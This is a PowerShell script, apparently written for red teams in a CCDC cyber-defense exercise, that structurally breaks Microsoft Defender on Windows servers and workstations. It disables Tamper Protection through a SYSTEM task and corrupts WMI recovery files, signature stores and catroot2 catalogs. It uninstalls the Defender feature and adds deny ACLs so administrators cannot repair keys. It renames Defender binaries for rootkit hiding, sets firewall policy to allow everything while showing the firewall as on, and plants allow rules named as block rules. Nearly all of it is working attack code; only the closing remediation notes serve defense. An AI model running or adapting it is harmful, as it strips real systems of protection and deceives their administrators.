# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 3 — Defender: Breaking Bad
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# MITRE ATT&CK: T1562.001 (Impair Defenses: Disable/Modify Tools)
#               T1490   (Inhibit System Recovery)
#               T1222   (File and Directory Permissions Modification)
#               T1564.001 (Hide Artifacts: Hidden Files and Directories)
#               T1562.004 (Impair Defenses: Disable or Modify System Firewall)
#               T1036   (Masquerading)
#
# Targets: Windows Server 2019, Server 2022, Windows 10
#
# Description:
#   Goes beyond Phase 1 DefenderNeuter (which merely disables AV via
#   Set-MpPreference, stops services, and sets policy registry keys).
#   This script STRUCTURALLY BREAKS Defender so that re-enabling it
#   fails or produces a non-functional state requiring media or reimaging:
#
#   1. WMI REPOSITORY CORRUPTION
#      - Removes Root\SecurityCenter2 AntiVirusProduct class instances
#      - Breaks the Defender MOF auto-recovery file so WMI repair
#        does not restore Defender's health registration
#
#   2. SIGNATURE STORE ACL LOCK
#      - Deletes all definition update subdirectories under
#        C:\ProgramData\Microsoft\Windows Defender\Definition Updates\
#      - Sets DENY ACL on that path tree for NT SERVICE\WinDefend
#      - Defender starts but cannot use or update signatures
#
#   3. CATALOG TRUST BREAK
#      - Removes Defender-related entries from catroot2
#      - Corrupts the SFC/CBS catalog for Defender components
#      - DISM-based repair fails silently
#
#   4. FEATURE UNINSTALL (Server targets only)
#      - Uninstall-WindowsFeature -Name Windows-Defender
#      - Requires WinSxS source media or online source to reinstall
#
#   5. DEFENDER UPDATE TASK FOLDER LOCK
#      - Deletes all \Microsoft\Windows\Windows Defender\ scheduled tasks
#      - Sets DENY ACE on that task folder so tasks cannot be
#        recreated without taking ownership
#
#   6. REGISTRY TRAP
#      - DisableAntiSpyware=1 + TamperProtection=0
#      - ACL-locks the policy key so admin must take ownership to write
#
# Plan reference: Phase_3_Tools/Scripts_Planning/Phase3_Windows_Plan.md
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

# PInvoke helper: enables SeTakeOwnershipPrivilege + SeRestorePrivilege so we can
# take ownership of protected registry keys before setting their ACLs.
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class WinPriv {
    [DllImport("advapi32.dll",SetLastError=true)] public static extern bool OpenProcessToken(IntPtr h,uint a,ref IntPtr t);
    [DllImport("advapi32.dll",SetLastError=true)] public static extern bool LookupPrivilegeValue(string s,string n,ref long l);
    [DllImport("advapi32.dll",SetLastError=true)] public static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TOKEN_PRIV n,uint b,IntPtr p,IntPtr r);
    [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr GetCurrentProcess();
    [StructLayout(LayoutKind.Sequential,Pack=1)]
    public struct TOKEN_PRIV { public int Count; public long Luid; public int Attr; }
    public static void Enable(string priv) {
        IntPtr tok = IntPtr.Zero;
        OpenProcessToken(GetCurrentProcess(), 0x28, ref tok);
        var tp = new TOKEN_PRIV(); tp.Count = 1; tp.Attr = 2;
        LookupPrivilegeValue(null, priv, ref tp.Luid);
        AdjustTokenPrivileges(tok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }
}
'@ -ErrorAction SilentlyContinue

function Grant-RegKeyOwnership {
    param([string]$KeyPath)
    try {
        [WinPriv]::Enable("SeTakeOwnershipPrivilege")
        [WinPriv]::Enable("SeRestorePrivilege")
        $hive   = if ($KeyPath -match '^HKLM') { [Microsoft.Win32.Registry]::LocalMachine } else { [Microsoft.Win32.Registry]::CurrentUser }
        $sub    = $KeyPath -replace '^HKL[CM]:\\', ''
        $key    = $hive.OpenSubKey($sub, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
                      [System.Security.AccessControl.RegistryRights]::TakeOwnership)
        $acl    = $key.GetAccessControl([System.Security.AccessControl.AccessControlSections]::None)
        $acl.SetOwner([System.Security.Principal.NTAccount]"BUILTIN\Administrators")
        $key.SetAccessControl($acl)
        # Re-open with ChangePermissions right now that we own it
        $key2   = $hive.OpenSubKey($sub, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
                      [System.Security.AccessControl.RegistryRights]::ChangePermissions)
        $acl2   = $key2.GetAccessControl()
        $rule   = New-Object System.Security.AccessControl.RegistryAccessRule(
                      "BUILTIN\Administrators",
                      [System.Security.AccessControl.RegistryRights]::FullControl,
                      [System.Security.AccessControl.InheritanceFlags]::ContainerInherit,
                      [System.Security.AccessControl.PropagationFlags]::None,
                      [System.Security.AccessControl.AccessControlType]::Allow)
        $acl2.AddAccessRule($rule)
        $key2.SetAccessControl($acl2)
        $key.Close(); $key2.Close()
        return $true
    } catch {
        Write-Warn "Grant-RegKeyOwnership failed for ${KeyPath}: $_"
        return $false
    }
}

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Phase 3 — Defender: Breaking Bad"
Write-Warn "================================================================"
Write-Host ""

# ── OS Detection ─────────────────────────────────────────────────────────────
$osInfo   = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
$prodType = if ($osInfo) { $osInfo.ProductType } else { 1 }
$isServer = $prodType -ne 1
Write-Info "ProductType=$prodType — $( if ($isServer) { 'Server SKU' } else { 'Workstation SKU' } )"

# Must match the r77 compile-time constant — default release build uses "$77"
$HIDE_PREFIX = '$77'

# ── Disable TamperProtection (must run before all other ops on fresh installs) ─
Write-Section "PREAMBLE — Disable TamperProtection"

# TamperProtection is ON by default on fresh installs. Set-MpPreference -DisableTamperProtection
# only works when the caller is NT AUTHORITY\SYSTEM (not merely admin). We schedule a one-shot
# SYSTEM task so the child process has the right token, wait for it, then remove it.
$tpTaskName = "CCDC_DisableTamperProt"
Unregister-ScheduledTask -TaskName $tpTaskName -Confirm:$false -ErrorAction SilentlyContinue
$tpAction    = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument '-NonInteractive -WindowStyle Hidden -Command "Set-MpPreference -DisableTamperProtection $true -Force"'
$tpPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$tpSettings  = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 1)
try {
    Register-ScheduledTask -TaskName $tpTaskName -Action $tpAction -Principal $tpPrincipal `
        -Settings $tpSettings -Force -ErrorAction Stop | Out-Null
    Start-ScheduledTask -TaskName $tpTaskName -ErrorAction Stop
    $tpWait = 0
    do { Start-Sleep -Seconds 1; $tpWait++ } while (
        (Get-ScheduledTask -TaskName $tpTaskName -ErrorAction SilentlyContinue).State -eq 'Running' -and $tpWait -lt 15
    )
    Unregister-ScheduledTask -TaskName $tpTaskName -Confirm:$false -ErrorAction SilentlyContinue
    Write-Success "TamperProtection disable task completed"
} catch {
    Write-Warn "Could not execute TamperProtection disable task: $_"
    Write-Warn "Subsequent layers may fail if TamperProtection is still active — re-run as SYSTEM"
}

# ── Stop Defender Services (prerequisite for file/registry access) ────────────
Write-Section "PREAMBLE — Stop Defender Services"

foreach ($svc in @("WinDefend","WdNisSvc","WdNisDrv","WdFilter","SecurityHealthService")) {
    $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
    if ($s) {
        try {
            Stop-Service -Name $svc -Force -ErrorAction Stop
            Write-Success "Stopped: $svc"
        } catch {
            Write-Warn "Could not stop ${svc}: $_"
            # Fallback: disable via registry so it does not restart on next boot
            $svcReg = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
            if (Test-Path $svcReg) {
                try {
                    Set-ItemProperty -Path $svcReg -Name "Start" -Value 4 -Type DWord -Force
                    Write-Info "$svc — set registry Start=4 (disabled at next boot)"
                } catch {
                    Write-Warn "Could not disable $svc via registry: $_"
                }
            }
        }
    }
}

# ── LAYER 1: WMI Repository Corruption (T1562.001) ───────────────────────────
Write-Section "LAYER 1 — WMI Repository Corruption"

# Remove all AV registrations from SecurityCenter2
$avEntries = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName "AntiVirusProduct" `
    -ErrorAction SilentlyContinue
if ($avEntries) {
    foreach ($entry in @($avEntries)) {
        try {
            $name = $entry.displayName
            Remove-CimInstance -InputObject $entry -ErrorAction Stop
            Write-Success "Removed WMI AV entry: $name"
        } catch {
            Write-Warn "Failed to remove AV entry: $_"
        }
    }
} else {
    Write-Warn "No AntiVirusProduct instances found in root/SecurityCenter2 (may already be gone)"
}

# Corrupt Defender MOF auto-recovery files so WMI restart won't re-register Defender
$wbemAuto = "$env:SystemRoot\System32\wbem\AutoRecover"
if (Test-Path $wbemAuto) {
    $mofFiles = Get-ChildItem $wbemAuto -Filter "*.mof" -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match "(?i)(defender|securitycenter|wscenter|wsc[._]|mpwbem|mpclient|mpas)" }
    if ($mofFiles) {
        foreach ($mof in $mofFiles) {
            try {
                [System.IO.File]::WriteAllBytes($mof.FullName, [byte[]]@(0x00))
                Write-Success "Zero'd MOF auto-recovery: $($mof.Name)"
            } catch {
                Write-Warn "Could not overwrite $($mof.Name): $_"
            }
        }
    } else {
        Write-Warn "No matching MOF auto-recovery files found — Defender may not have been registered"
    }

    # Also delete any non-.mof Defender/SC registration files
    Get-ChildItem $wbemAuto -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match "defender|mpwbem|mpclient|wscsvc|wscapi" } |
        ForEach-Object {
            try { Remove-Item $_.FullName -Force; Write-Success "Removed: $($_.Name)" }
            catch { Write-Warn "Could not remove $($_.Name): $_" }
        }
} else {
    Write-Warn "WMI AutoRecover path not found: $wbemAuto"
}

# ── LAYER 2: Signature Store ACL Lock (T1490 + T1222) ────────────────────────
Write-Section "LAYER 2 — Signature Store ACL Lock"

$defPath = "$env:ProgramData\Microsoft\Windows Defender\Definition Updates"
if (Test-Path $defPath) {
    # Wipe existing definition subdirectories
    $dirs = Get-ChildItem $defPath -Directory -ErrorAction SilentlyContinue
    if ($dirs) {
        $dirs | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
        Write-Success "Deleted $($dirs.Count) definition update subdirectorie(s)"
    } else {
        Write-Info "Definition Updates directory already empty"
    }

    # Apply DENY FullControl for NT SERVICE\WinDefend on the path tree.
    # takeown first so we hold the owner token, then icacls for the deny ACE.
    & takeown.exe /F $defPath /R /A /D Y 2>$null | Out-Null
    & icacls.exe $defPath /deny "NT SERVICE\WinDefend:(OI)(CI)(F)" /T /C /Q 2>$null
    if ($LASTEXITCODE -eq 0) {
        Write-Success "DENY FullControl -> NT SERVICE\WinDefend on: $defPath"
    } else {
        Write-Err "icacls DENY failed on Definition Updates (exit $LASTEXITCODE)"
    }
} else {
    Write-Warn "Definition Updates path not found (Defender may not be installed): $defPath"
}

# Also wipe NIS signature store
$nisPath = "$env:ProgramData\Microsoft\Windows Defender\NIS\Definitions"
if (Test-Path $nisPath) {
    Remove-Item $nisPath -Recurse -Force -ErrorAction SilentlyContinue
    Write-Success "Wiped NIS Definitions: $nisPath"
}

# ── LAYER 3: Catalog Trust Break (T1490) ─────────────────────────────────────
Write-Section "LAYER 3 — Catalog Trust Break"

# Stop CryptSvc so catroot2 ESE database files are not locked
$cryptSvc = Get-Service -Name "CryptSvc" -ErrorAction SilentlyContinue
if ($cryptSvc) {
    try {
        Stop-Service -Name "CryptSvc" -Force -ErrorAction Stop
        Write-Success "Stopped CryptSvc"
        $svcWait = 0
        while ((Get-Service -Name "CryptSvc" -ErrorAction SilentlyContinue).Status -ne "Stopped" -and $svcWait -lt 10) {
            Start-Sleep -Seconds 1; $svcWait++
        }
    } catch {
        Write-Warn "Could not stop CryptSvc: $_"
    }
}

# Corrupt catroot2 database files (ESE .log files and catdb)
$catroot2 = "$env:SystemRoot\System32\catroot2"
if (Test-Path $catroot2) {
    $logFiles = Get-ChildItem $catroot2 -Recurse -Filter "*.log" -ErrorAction SilentlyContinue
    if ($logFiles) {
        $logFiles | Remove-Item -Force -ErrorAction SilentlyContinue
        Write-Success "Deleted $($logFiles.Count) catroot2 transaction log(s)"
    }

    $catdbFiles = Get-ChildItem $catroot2 -Recurse -Filter "catdb" -ErrorAction SilentlyContinue
    foreach ($db in @($catdbFiles)) {
        try {
            [System.IO.File]::WriteAllBytes($db.FullName, [byte[]](0x00,0x00,0x00,0x00))
            Write-Success "Corrupted catdb: $($db.FullName)"
        } catch {
            Write-Warn "Could not corrupt $($db.FullName): $_"
        }
    }
} else {
    Write-Warn "catroot2 path not found: $catroot2"
}

# Delete Defender-related catalog files from the signed catalog store
# (breaks sfc /scannow repair path for Defender components)
$catStore = "$env:SystemRoot\System32\catroot\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}"
if (Test-Path $catStore) {
    $defCats = Get-ChildItem $catStore -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match "defender|MpSig|Mpam|mpas|msfull|mpasbase" }
    if ($defCats) {
        $defCats | Remove-Item -Force -ErrorAction SilentlyContinue
        Write-Success "Removed $($defCats.Count) Defender catalog file(s) from catroot"
    } else {
        Write-Info "No Defender catalog files matched in catroot (may vary by version)"
    }
}

# Restart CryptSvc — it will rebuild an empty catroot2, all Defender entries gone
try {
    Start-Service -Name "CryptSvc" -ErrorAction SilentlyContinue
    Write-Info "CryptSvc restarted (catroot2 will rebuild empty)"
} catch {
    Write-Warn "Could not restart CryptSvc: $_"
}

# ── LAYER 4: Feature Uninstall — Server targets only (T1562.001) ──────────────
Write-Section "LAYER 4 — Feature Uninstall (Server Only)"

if ($isServer) {
    Import-Module ServerManager -ErrorAction SilentlyContinue
    $feat = Get-WindowsFeature -Name "Windows-Defender" -ErrorAction SilentlyContinue
    if ($feat -and $feat.Installed) {
        try {
            Uninstall-WindowsFeature -Name "Windows-Defender" -ErrorAction Stop | Out-Null
            Write-Success "Windows-Defender feature uninstalled — requires WinSxS source media to restore"
        } catch {
            Write-Err "Feature uninstall failed: $_"
            Write-Info "Trying DISM fallback..."
            & dism.exe /Online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /Quiet 2>$null
            if ($LASTEXITCODE -eq 0) {
                Write-Success "DISM feature removal succeeded"
            } else {
                Write-Warn "DISM also failed (exit $LASTEXITCODE) — using registry disable fallback"
                # Registry fallback: mark all Defender driver services as disabled so they
                # do not load on next boot even if the feature can't be formally uninstalled.
                $defSvcs = @("WinDefend","WdNisSvc","WdNisDrv","WdFilter","WdBoot","WdSensor")
                foreach ($ds in $defSvcs) {
                    $dsReg = "HKLM:\SYSTEM\CurrentControlSet\Services\$ds"
                    if (Test-Path $dsReg) {
                        Set-ItemProperty -Path $dsReg -Name "Start" -Value 4 -Type DWord -Force -ErrorAction SilentlyContinue
                        Write-Info "Registry disabled: $ds (Start=4)"
                    }
                }
                # Also mark the feature as not available via CBS
                $cbsKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\PackagesPending"
                Write-Info "Registry fallback complete — Defender services will not load on next boot"
            }
        }
    } elseif ($feat -and -not $feat.Installed) {
        Write-Warn "Windows-Defender feature exists but is already uninstalled"
    } else {
        Write-Warn "Windows-Defender feature not found via Get-WindowsFeature"
    }
} else {
    Write-Info "Workstation SKU — skipping feature uninstall (only available on Server)"
}

# ── LAYER 5: Task Folder Lock (T1562.001) ─────────────────────────────────────
Write-Section "LAYER 5 — Task Folder Lock"

# Delete all scheduled tasks under \Microsoft\Windows\Windows Defender\
$defTasks = Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\" `
    -ErrorAction SilentlyContinue
if ($defTasks) {
    $defTasks | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
    Write-Success "Unregistered $($defTasks.Count) Defender scheduled task(s)"
} else {
    Write-Info "No Defender scheduled tasks found (may already be removed by Phase 1)"
}

# DENY write on the tasks directory so tasks can't be recreated without taking ownership
$taskDir = "$env:SystemRoot\System32\Tasks\Microsoft\Windows\Windows Defender"
if (-not (Test-Path $taskDir)) {
    New-Item -ItemType Directory -Path $taskDir -Force -ErrorAction SilentlyContinue | Out-Null
    Write-Info "Created empty task folder for ACL lock: $taskDir"
}
& icacls.exe $taskDir /deny "BUILTIN\Administrators:(CI)(OI)(W,D,WD,WO)" /T /C /Q 2>$null
$rc1 = $LASTEXITCODE
& icacls.exe $taskDir /deny "NT AUTHORITY\SYSTEM:(CI)(OI)(W,D,WD,WO)" /T /C /Q 2>$null
$rc2 = $LASTEXITCODE
if ($rc1 -eq 0 -and $rc2 -eq 0) {
    Write-Success "DENY write ACE applied to task folder: $taskDir"
} else {
    Write-Warn "icacls partial failure on task folder (rc1=$rc1 rc2=$rc2)"
}

# Lock the corresponding registry task cache key (double-lock)
$taskReg = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\Windows Defender"
if (Test-Path $taskReg) {
    # Take ownership first so we can apply a DENY ACE on a TrustedInstaller-owned key
    $owned = Grant-RegKeyOwnership -KeyPath $taskReg
    if ($owned) { Write-Info "Took ownership of task cache registry key" }
    try {
        $tacl  = Get-Acl $taskReg
        $tdeny = New-Object System.Security.AccessControl.RegistryAccessRule(
            "BUILTIN\Administrators",
            [System.Security.AccessControl.RegistryRights]::WriteKey,
            [System.Security.AccessControl.InheritanceFlags]::ContainerInherit,
            [System.Security.AccessControl.PropagationFlags]::None,
            [System.Security.AccessControl.AccessControlType]::Deny)
        $tacl.AddAccessRule($tdeny)
        Set-Acl -Path $taskReg -AclObject $tacl
        Write-Success "DENY WriteKey applied to task cache registry key"
    } catch {
        Write-Warn "Could not lock task cache registry key: $_"
    }
} else {
    Write-Info "Task cache registry key not present (tasks were already absent)"
}

# ── LAYER 6: Registry Trap (T1562.001) ────────────────────────────────────────
Write-Section "LAYER 6 — Registry Trap"

# Write policy values first, then lock — order matters
$policyKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
if (-not (Test-Path $policyKey)) {
    New-Item -Path $policyKey -Force | Out-Null
    Write-Info "Created policy key: $policyKey"
}
Set-ItemProperty -Path $policyKey -Name "DisableAntiSpyware"        -Value 1 -Type DWord
Set-ItemProperty -Path $policyKey -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord
Set-ItemProperty -Path $policyKey -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord
Set-ItemProperty -Path $policyKey -Name "DisableAntiVirus"          -Value 1 -Type DWord
Write-Success "Wrote disable policy values to: $policyKey"

# Set TamperProtection=0 in the Defender features key.
# Key is owned by TrustedInstaller — must take ownership before writing.
$tamperKey = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
if (Test-Path $tamperKey) {
    $owned = Grant-RegKeyOwnership -KeyPath $tamperKey
    if ($owned) { Write-Info "Took ownership of Defender\Features" }
    try {
        Set-ItemProperty -Path $tamperKey -Name "TamperProtection" -Value 0 -Type DWord -Force
        Write-Success "TamperProtection = 0 in Defender\Features"
    } catch {
        Write-Warn "Could not set TamperProtection: $_"
    }
}

# ACL-lock the policy key: deny Administrators WriteKey — must take ownership to undo
try {
    $racl  = Get-Acl $policyKey
    $rdeny = New-Object System.Security.AccessControl.RegistryAccessRule(
        "BUILTIN\Administrators",
        [System.Security.AccessControl.RegistryRights]::WriteKey,
        [System.Security.AccessControl.InheritanceFlags]::ContainerInherit,
        [System.Security.AccessControl.PropagationFlags]::None,
        [System.Security.AccessControl.AccessControlType]::Deny)
    $racl.AddAccessRule($rdeny)
    Set-Acl -Path $policyKey -AclObject $racl
    Write-Success "DENY WriteKey applied to policy key — admin must take ownership to modify"
} catch {
    Write-Err "Failed to lock policy key ACL: $_"
}

# ── LAYER 7: Defender Recovery Binary Rename (T1564.001) ─────────────────────
Write-Section "LAYER 7 — Defender Recovery Binary Rename"

# Rename key Defender executables with the $77 hide prefix.
# Once Rootkit_r77Shadow.ps1 is running, $77-prefixed names vanish from
# dir, Get-ChildItem, and Explorer — blue team loses their repair/diagnostic tools.
# Services are already stopped from the preamble, so files are unlocked.
$DefenderBinTargets = @(
    "$env:ProgramFiles\Windows Defender\MpCmdRun.exe",
    "$env:ProgramFiles\Windows Defender\MsMpEng.exe",
    "$env:ProgramFiles\Windows Defender\MpDefenderCoreService.exe",
    "$env:SystemRoot\System32\MpSigStub.exe"
)
foreach ($bin in $DefenderBinTargets) {
    if (-not (Test-Path $bin)) {
        Write-Warn "Not found (skip): $bin"
        continue
    }
    $dir     = Split-Path $bin -Parent
    $leaf    = Split-Path $bin -Leaf
    $newPath = Join-Path $dir ($HIDE_PREFIX + $leaf)
    if (Test-Path $newPath) {
        Write-Info "Already renamed: $leaf -> $($HIDE_PREFIX + $leaf)"
        continue
    }
    & takeown.exe /F $bin /A 2>$null | Out-Null
    & icacls.exe $bin /grant "BUILTIN\Administrators:(F)" /C /Q 2>$null | Out-Null
    try {
        Rename-Item -Path $bin -NewName ($HIDE_PREFIX + $leaf) -Force -ErrorAction Stop
        Write-Success "Renamed: $leaf -> $($HIDE_PREFIX + $leaf)"
    } catch {
        Write-Warn "Rename-Item failed for $leaf — trying cmd /c move..."
        $rc = (Start-Process -FilePath "cmd.exe" `
                             -ArgumentList "/c move /Y `"$bin`" `"$newPath`"" `
                             -WindowStyle Hidden -Wait -PassThru).ExitCode
        if ($rc -eq 0) {
            Write-Success "cmd move succeeded: $leaf -> $($HIDE_PREFIX + $leaf)"
        } else {
            Write-Err "Could not rename ${leaf} (exit $rc) — file may still be in use"
        }
    }
}

# ── LAYER 8: Firewall Phantom (T1562.004 + T1036) ─────────────────────────────
Write-Section "LAYER 8 — Firewall Phantom"

# Part A — Policy Ghost
# -----------------------------------------------------------------------
# Windows Firewall GROUP POLICY keys take precedence over local rules.
# DefaultInboundAction=0 (Allow) means every "Block" rule blue team adds via
# New-NetFirewallRule or netsh is silently overridden. EnableFirewall=1 keeps
# the firewall appearing ON in all UI surfaces. The parent key is ACL-locked
# so blue team cannot flip values even as admin.

# Re-enable mpssvc in case Phase 1 disabled it — firewall must be running
# for the phantom to be visible to blue team.
$fwSvc = Get-Service -Name "mpssvc" -ErrorAction SilentlyContinue
if ($fwSvc -and $fwSvc.Status -ne "Running") {
    try {
        Set-Service -Name "mpssvc" -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service -Name "mpssvc" -ErrorAction Stop
        Write-Success "mpssvc re-enabled and started (firewall phantom mode)"
    } catch {
        Write-Warn "Could not start mpssvc: $_"
    }
} else {
    Write-Info "mpssvc is already running"
}

# Also undo Phase 1's registry disable of mpssvc if present
$mpssvcReg = "HKLM:\SYSTEM\CurrentControlSet\Services\mpssvc"
if (Test-Path $mpssvcReg) {
    Set-ItemProperty -Path $mpssvcReg -Name "Start" -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue
}

$fwPolicyParent = "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall"
if (-not (Test-Path $fwPolicyParent)) {
    New-Item -Path $fwPolicyParent -Force | Out-Null
}

foreach ($profile in @("DomainProfile","PrivateProfile","PublicProfile","StandardProfile")) {
    $profileKey = "$fwPolicyParent\$profile"
    if (-not (Test-Path $profileKey)) { New-Item -Path $profileKey -Force | Out-Null }
    Set-ItemProperty -Path $profileKey -Name "EnableFirewall"        -Value 1 -Type DWord -Force
    Set-ItemProperty -Path $profileKey -Name "DefaultInboundAction"  -Value 0 -Type DWord -Force  # 0 = Allow
    Set-ItemProperty -Path $profileKey -Name "DefaultOutboundAction" -Value 0 -Type DWord -Force  # 0 = Allow
    Set-ItemProperty -Path $profileKey -Name "DisableNotifications"  -Value 1 -Type DWord -Force
    Write-Success "Phantom policy: $profile (EnableFirewall=1, DefaultInboundAction=Allow)"
}

# ACL-lock parent key with ContainerInherit — blue team cannot change any
# profile subkey without taking ownership first
$owned = Grant-RegKeyOwnership -KeyPath $fwPolicyParent
if ($owned) { Write-Info "Took ownership of firewall policy parent key" }
try {
    $fwAcl = Get-Acl $fwPolicyParent
    foreach ($principal in @("BUILTIN\Administrators","NT AUTHORITY\SYSTEM")) {
        $fwDeny = New-Object System.Security.AccessControl.RegistryAccessRule(
            $principal,
            [System.Security.AccessControl.RegistryRights]::WriteKey,
            [System.Security.AccessControl.InheritanceFlags]::ContainerInherit,
            [System.Security.AccessControl.PropagationFlags]::None,
            [System.Security.AccessControl.AccessControlType]::Deny)
        $fwAcl.AddAccessRule($fwDeny)
    }
    Set-Acl -Path $fwPolicyParent -AclObject $fwAcl
    Write-Success "DENY WriteKey (ContainerInherit) applied to firewall policy key — admin must take ownership to fix"
} catch {
    Write-Err "Failed to lock firewall policy key ACL: $_"
}

# Part B — Deceptive "Defensive" Rules
# -----------------------------------------------------------------------
# Rules whose display names read as defensive/blocking but whose Action is
# Allow. Blue team sees "BLOCK-Unauthorized-Inbound" in Get-NetFirewallRule
# and assumes protection is in place. Get-NetFirewallRule | Where Action -eq Block
# returns nothing for these, but blue team rarely checks Action directly.
$decoyRules = @(
    @{ Name="BLOCK-Unauthorized-Inbound"; DisplayName="Block Unauthorized Inbound";           Direction="Inbound";  Action="Allow" },
    @{ Name="Defender-Protected-Inbound"; DisplayName="Defender-Protected Inbound Policy";    Direction="Inbound";  Action="Allow" },
    @{ Name="FW-Emergency-Lockdown-All";  DisplayName="Emergency Lockdown All Unauthorized";  Direction="Outbound"; Action="Allow" }
)
foreach ($rule in $decoyRules) {
    Remove-NetFirewallRule -Name $rule.Name -ErrorAction SilentlyContinue
    try {
        New-NetFirewallRule -Name $rule.Name -DisplayName $rule.DisplayName `
            -Direction $rule.Direction -Action $rule.Action `
            -Protocol Any -Enabled True -ErrorAction Stop | Out-Null
        Write-Success "Planted decoy rule: '$($rule.DisplayName)' (Action=$($rule.Action), looks like block)"
    } catch {
        Write-Warn "Could not create decoy rule '$($rule.Name)': $_"
    }
}

# ── LAYER 9: Firewall Management Tool Rename (T1564.001) ─────────────────────
Write-Section "LAYER 9 — Firewall Management Tool Rename"

# Rename the firewall snap-in and control panel DLL so blue team can't open
# the GUI management console. wf.msc disappears from Run/Start Search;
# FirewallControlPanel.dll breaks the Settings firewall config page.
# Do NOT rename netsh.exe (system-critical) or mpssvc.dll (breaks phantom).
$FwToolTargets = @(
    "$env:SystemRoot\System32\wf.msc",
    "$env:SystemRoot\System32\FirewallControlPanel.dll"
)
foreach ($tool in $FwToolTargets) {
    if (-not (Test-Path $tool)) {
        Write-Warn "Not found (skip): $tool"
        continue
    }
    $dir     = Split-Path $tool -Parent
    $leaf    = Split-Path $tool -Leaf
    $newPath = Join-Path $dir ($HIDE_PREFIX + $leaf)
    if (Test-Path $newPath) {
        Write-Info "Already renamed: $leaf"
        continue
    }
    & takeown.exe /F $tool /A 2>$null | Out-Null
    & icacls.exe $tool /grant "BUILTIN\Administrators:(F)" /C /Q 2>$null | Out-Null
    try {
        Rename-Item -Path $tool -NewName ($HIDE_PREFIX + $leaf) -Force -ErrorAction Stop
        Write-Success "Renamed: $leaf -> $($HIDE_PREFIX + $leaf)"
    } catch {
        Write-Warn "Could not rename ${leaf}: $_"
    }
}

# ── Summary ───────────────────────────────────────────────────────────────────
Write-Host ""
Write-Success "================================================================"
Write-Success " Defender_BreakingBad complete — review output above for layer status"
Write-Success "================================================================"
Write-Host ""
Write-Info "Blue team remediation required:"
Write-Info "  L1: winmgmt /resetrepository; recompile Defender MOFs:"
Write-Info "      mofcomp.exe %SystemRoot%\System32\wbem\securitycenter.mof"
Write-Info "  L2: Restore ACL on Definition Updates path (take ownership first),"
Write-Info "      then trigger manual update: Update-MpSignature"
Write-Info "  L3: Stop CryptSvc; delete/rename catroot2; restart CryptSvc;"
Write-Info "      run: sfc /scannow  and  DISM /Online /Cleanup-Image /RestoreHealth /Source:<media>"
Write-Info "  L4: (Server) Install-WindowsFeature Windows-Defender"
Write-Info "      -Source WIM:\\<media>\sources\install.wim:2"
Write-Info "  L5: takeown /F <taskdir> /R /A; icacls <taskdir> /remove:d Administrators /T"
Write-Info "      Then recreate Defender tasks via: Add-WindowsFeature / Defender service restart"
Write-Info "  L6: takeown /F HKLM\SOFTWARE\Policies\Microsoft\Windows Defender (regedit)"
Write-Info "      Delete DisableAntiSpyware; restore TamperProtection=5 in Defender\Features"
Write-Info "  L7: Defender binaries renamed with `$77 prefix — find via:"
Write-Info "      dir /a 'C:\Program Files\Windows Defender\`$77*'"
Write-Info "      Rename back: Rename-Item `$77MpCmdRun.exe MpCmdRun.exe (after killing rootkit)"
Write-Info "  L8: Firewall policy ghost — takeown on HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall"
Write-Info "      Then delete DefaultInboundAction / DefaultOutboundAction values in each *Profile key"
Write-Info "      Remove decoy rules: Remove-NetFirewallRule -Name BLOCK-Unauthorized-Inbound,etc."
Write-Info "  L9: wf.msc / FirewallControlPanel.dll renamed with `$77 prefix — find and rename back"
Write-Info "      after rootkit is removed: dir /a C:\Windows\System32\`$77*.msc"
Write-Host ""
